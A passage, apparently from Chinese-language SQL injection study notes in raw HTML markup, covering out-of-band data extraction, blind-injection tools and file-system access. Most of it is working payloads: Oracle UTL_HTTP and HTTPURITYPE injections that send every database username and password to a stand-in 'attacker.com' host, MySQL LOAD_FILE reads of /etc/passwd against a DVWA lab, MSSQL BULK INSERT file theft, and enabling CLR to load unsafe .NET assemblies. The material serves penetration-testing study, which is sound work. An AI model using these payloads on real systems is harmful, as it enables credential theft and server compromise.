review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;UTL_HTTP&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;REQUEST&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;www.attacker.com/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;复查web日志会发现一条包含数据库登录的日志&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#Oracle llg：&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;CHR&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;UTL_HTTP&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;REQUEST&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;www.attacker.com/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;stragg&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;DISTINCT&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;61&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;password&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;59&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; dba_users&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&#39;a

&lt;span class=&#34;token comment&#34;&gt;-- 将所有用户名和口令发送给了攻击者的访问日志&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#Oracle 9z R2和更高版本的+XMLB：&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;CHR&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;UTL_HTTP&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;REQUEST&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;attacker.com/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; xmltransform&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys_xmlagg&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys_xmlgen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;xmltype&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;?xml version=&#34;l.0&#34;?&amp;gt; &amp;lt;xsl:stylesheet version=&#34;1.0&#34; xmlns:xs1=&#34;http://www.w3.org/1999/XSL/Transform&#34;&amp;gt;&amp;lt;xsl:template match=&#34;/&#34;&amp;gt;&amp;lt;xsl:for-each select=&#34;/ROWSET/ USERNAME&#34;&amp;gt;&amp;lt;xsl:value-of select=&#34;text()&#34;/&amp;gt;;&amp;lt;/xsl:for-each&amp;gt;&amp;lt;/xsl:templatex/xsl:stylesheet&amp;gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;getstringval&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; listagg &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; all_users&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&#39;a&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#HTTPURITYPE&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;LENGTH&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;HTTPURITYPE&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;http://attacker/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;username&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;=&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;getclob &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;$ &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#=0 AND LENGTH(password)=16)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Web服务器的访问日志文件将包含数据库的所有用户名和口令。&lt;/p&gt;
&lt;p&gt;注入ORDER BY子句&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; banner &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; v$version &lt;span class=&#34;token keyword&#34;&gt;ORDER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; LENGTH&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; dba_users &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; UTL_HTTP&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;REQUEST&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;www.attacker.com/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;username&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;=&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;IS&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;NOT&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;ICMP渗透&#34;&gt;&lt;a href=&#34;#ICMP渗透&#34; class=&#34;headerlink&#34; title=&#34;ICMP渗透&#34;&gt;&lt;/a&gt;ICMP渗透&lt;/h4&gt;&lt;h3 id=&#34;自动SQL盲注利用&#34;&gt;&lt;a href=&#34;#自动SQL盲注利用&#34; class=&#34;headerlink&#34; title=&#34;自动SQL盲注利用&#34;&gt;&lt;/a&gt;自动SQL盲注利用&lt;/h3&gt;&lt;h4 id=&#34;Absinthe&#34;&gt;&lt;a href=&#34;#Absinthe&#34; class=&#34;headerlink&#34; title=&#34;Absinthe&#34;&gt;&lt;/a&gt;Absinthe&lt;/h4&gt;&lt;p&gt;Absinthe的威力在于支持数据库映射，并且能利用基于错误和响应的推断利用来对很多流行的数据库（不管是商业的还是开源的）进行检索。方便的GUI为攻击者带来了很好的体验，但缺少特征签名支持限制了其效能。&lt;/p&gt;
&lt;h4 id=&#34;BSQL-Hacker&#34;&gt;&lt;a href=&#34;#BSQL-Hacker&#34; class=&#34;headerlink&#34; title=&#34;BSQL Hacker&#34;&gt;&lt;/a&gt;BSQL Hacker&lt;/h4&gt;&lt;p&gt;BSQL Hacker是另一款图形化工具，它使用基于时间及响应的推断技术和标准错误来从所提问的数据库中提取数据。虽然它仍处于测试阶段，不是很稳定，但该工具前景很好且提供了很多欺诈机会。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://labs.portcullis.co.uk/apologies-page-not-found/#aHR0cHM6Ly9sYWJzLnBvcnRjdWxsaXMuY28udWsvYXBwbGljYXRpb24vYnNhbC1oYWNrZXI=&#34;&gt;Apologies, page not found | Portcullis Labs&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;SQLBrute&#34;&gt;&lt;a href=&#34;#SQLBrute&#34; class=&#34;headerlink&#34; title=&#34;SQLBrute&#34;&gt;&lt;/a&gt;SQLBrute&lt;/h4&gt;&lt;p&gt;SQLBrute是一款命令行工具，它针对希望使用基于时间或响应的推断来利用某个固定漏洞的用户。&lt;/p&gt;
&lt;h4 id=&#34;Sqlmap-1&#34;&gt;&lt;a href=&#34;#Sqlmap-1&#34; class=&#34;headerlink&#34; title=&#34;Sqlmap&#34;&gt;&lt;/a&gt;Sqlmap&lt;/h4&gt;&lt;p&gt;Sqlmap将漏洞的发现和利用结合在一款强大的工具中，它既支持基于时间的推断方法，也支持基于响应的推断方法，另外还支持ICMP通道方法。该工具的成长速度很快，开发也很活跃。&lt;/p&gt;
&lt;h4 id=&#34;Sqlninja&#34;&gt;&lt;a href=&#34;#Sqlninja&#34; class=&#34;headerlink&#34; title=&#34;Sqlninja&#34;&gt;&lt;/a&gt;Sqlninja&lt;/h4&gt;&lt;p&gt;Sqlninja有很多特性，它支持使用基于DNS的非主流通道来执行远程命令。首先上传一个自定义的二进制封装器（wrapper），然后通过上传的封装器来执行命令。封装器捕获所有来自命令的输出并初始化一个DNS请求序列，请求中包含了编码后的输出。&lt;/p&gt;
&lt;h4 id=&#34;Squeeza&#34;&gt;&lt;a href=&#34;#Squeeza&#34; class=&#34;headerlink&#34; title=&#34;Squeeza&#34;&gt;&lt;/a&gt;Squeeza&lt;/h4&gt;&lt;p&gt;Squeeza则从另一个视角审视SQL注入，它将数据创建与数据提取区分开来。该命令行工具可使用基于时间的推断、标准错误或DNS来提取时间。DNS通道完全借助T-SQL来执行，因而不需要上传二进制封装器。&lt;/p&gt;
&lt;h2 id=&#34;利用操作系统&#34;&gt;&lt;a href=&#34;#利用操作系统&#34; class=&#34;headerlink&#34; title=&#34;利用操作系统&#34;&gt;&lt;/a&gt;利用操作系统&lt;/h2&gt;&lt;p&gt;访问文件系统以执行有效的任务（比如读取数据和上传文件）&lt;/p&gt;
&lt;h3 id=&#34;访问文件系统&#34;&gt;&lt;a href=&#34;#访问文件系统&#34; class=&#34;headerlink&#34; title=&#34;访问文件系统&#34;&gt;&lt;/a&gt;访问文件系统&lt;/h3&gt;&lt;h4 id=&#34;读文件&#34;&gt;&lt;a href=&#34;#读文件&#34; class=&#34;headerlink&#34; title=&#34;读文件&#34;&gt;&lt;/a&gt;读文件&lt;/h4&gt;&lt;p&gt;攻击者希望能够读取ASCII文本和二进制文件。&lt;/p&gt;
&lt;h5 id=&#34;MySQL&#34;&gt;&lt;a href=&#34;#MySQL&#34; class=&#34;headerlink&#34; title=&#34;MySQL&#34;&gt;&lt;/a&gt;MySQL&lt;/h5&gt;&lt;p&gt;MySQL提供LOAD DATA INFILE和LOAD_FILE命令将文本文件读到数据库中。&lt;/p&gt;
&lt;p&gt;LOAD DATA INFILE语句以非常快的速度从文本文件中读取一行数据至表中。文件名必须是字符串字面值。&lt;/p&gt;
&lt;p&gt;用法&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#先创建一个文本test.txt，格式：&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#name school old&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#创建一张表来保存读取的信息&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; test&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;school &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;old &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#读取并填充表&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;load&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;infile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/xxx/test.txt&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; test &lt;span class=&#34;token keyword&#34;&gt;fields&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;terminated&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#读取成功&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;LOAD_FILE该函数不创建表可以直接传递结果&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; load_file&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/xxx/test.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#注入回显文件的内容&lt;/span&gt;
dvwa&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;vulnerabilities&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; union select 1,load_file(&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;etc&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;passwd&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;Submit&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;Submit&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#通常etc/passwd换成16进制，以省略单引号&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#获取二进制文件&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;union select NULL,HEX(LOAD_FILE(&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;tmp&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;temp&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ini&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;LOAD_FILE（）还接收UNC（通用命名约定）路径，攻击者可以在其他机器上搜索文件，甚至可以引导MySQL服务器连接到他们自己的机器&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; load_file&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;//172.16.125.2/temp_smb/test.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;Mssql&#34;&gt;&lt;a href=&#34;#Mssql&#34; class=&#34;headerlink&#34; title=&#34;Mssql&#34;&gt;&lt;/a&gt;Mssql&lt;/h5&gt;&lt;p&gt;攻击者（己经获取系统管理员权限）通常首先借用的是BULK INSERT语句。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test.asp?sname=%&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#返回了所有用户，注入点&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#确定所运行的权限 sa&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//test.asp?sname=&#39;union select NULL,NULL,NULL,loginame FROM master..sysprocesses&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; spid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; @&lt;span class=&#34;token variable&#34;&gt;@SPID&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#执行读取命令&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//test.asp?sname=&#39;; create table hacked(line varchar(8000)); bulk insert hacked from &#39;c:\boot.ini&#39;;-- &lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#查看表就会看到已经插入&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//test.asp?sname=&#39;union select NULL,NULL,NULL,line from hacked-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Squeeza工具，允许攻击者在后台临时表中执行批量插入，然后使用所选的通信机制（DNS、错误消息、时间）来提取信息，最后再在攻击者的机器上重建该文件。&lt;/p&gt;
&lt;p&gt;使用一个针对目标应用程序的squeeza.config文件来提取两个文件——远程服务器的 boot.ini 和二进制的 c:\winnt\system32\net.exe&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;coрy 
c:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;boot.ini stolen-boot.ini 
c:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;winnt&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;system32&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;net.exe stolen-net.exe
&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;quit&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;缺少批量插入方法&lt;/p&gt;
&lt;p&gt;使用(滥用)Scripting.FileSystemObject。&lt;/p&gt;
&lt;p&gt;引入了公共语言运行时(Microsoft Language Runtime，CLR)。它允许开发人员将.NET二进制文件轻而易举地集成到数据库中。&lt;/p&gt;
&lt;p&gt;通过向SQL Server导入程序集时所使用的方法来实现，SQL Server 2005默 认禁用了CLR集成。拥有系统管理员或与之等价的权限，以使用sp configure存储过程重新启用该功能&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;token string&#34;&gt;&#39;show advanced options&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;RECONFIGURE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;token string&#34;&gt;&#39;clr enabled&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;RECONFIGURE&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#使用CREATE ASSEMBLY函数从远程服务器加载任何.NET二进制文件至数据库中&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#使用下列注入字符串加载.NET程序集c:\temp\test.exe：&lt;/span&gt;
sname&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;;create assembly sqb from &#39;&lt;/span&gt;c:\&lt;span class=&#34;token keyword&#34;&gt;temp&lt;/span&gt;\test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exe&lt;span class=&#34;token string&#34;&gt;&#39; with permission_set =unsafe-- 

#SQL Server在sys.assembly_files表中存储原始的二进制文件（作为HEX字符串）

